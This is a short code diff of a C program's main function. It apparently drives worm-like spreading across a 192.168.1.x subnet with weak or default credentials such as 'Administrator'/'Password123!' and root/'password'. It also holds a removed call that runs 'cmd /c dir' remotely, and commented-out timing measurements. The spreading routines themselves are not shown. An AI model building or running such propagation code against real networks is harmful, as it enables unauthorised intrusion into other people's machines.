@@ -1,7 +1,31 @@
 #include "net.h"
 
+// #include <stdio.h>
+// #include <time.h>
+
 int main() {
-    // establish_connection("192.168.1.21", "Administrator", "Password123!", "cmd /c dir", get_os_type("192.168.1.21"));
-    spread_linux("192.168.1.32", "root", "password123");
-    return 0;
+    spread("192.168.1", "password");
 }
+
+
+// int main() {
+//     struct timeval start, end;
+//     double time_used;
+
+//     gettimeofday(&start, NULL);
+//     // code to time here
+//     spread("192.168.1", "password");
+
+//     gettimeofday(&end, NULL);
+
+//     time_used = (end.tv_sec - start.tv_sec) + (double) (end.tv_usec - start.tv_usec) / 1000000;
+//     printf("Time used: %f seconds\n", time_used);
+
+//     return 0;
+// }
+
+// 1.098728
+// 5.087897
+// 25.079487
+// 50.068203
+// 100.064031
